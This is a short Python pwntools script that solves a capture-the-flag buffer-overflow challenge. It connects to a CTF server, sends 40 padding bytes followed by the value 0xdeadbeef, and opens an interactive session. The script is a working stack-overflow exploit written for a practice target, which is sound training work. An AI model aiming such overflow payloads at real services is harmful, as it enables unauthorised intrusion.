#!/usr/bin/python3

from pwn import * 

# p = process("challenge/chall1")
p = remote("pwn.ctf.shellmates.club",1501)
offset = 40
paylaod = 'A'*offset +'\xef\xbe\xad\xde'  # deadbeef ---> ef + be + ad + de

p.sendline(paylaod)
p.interactive()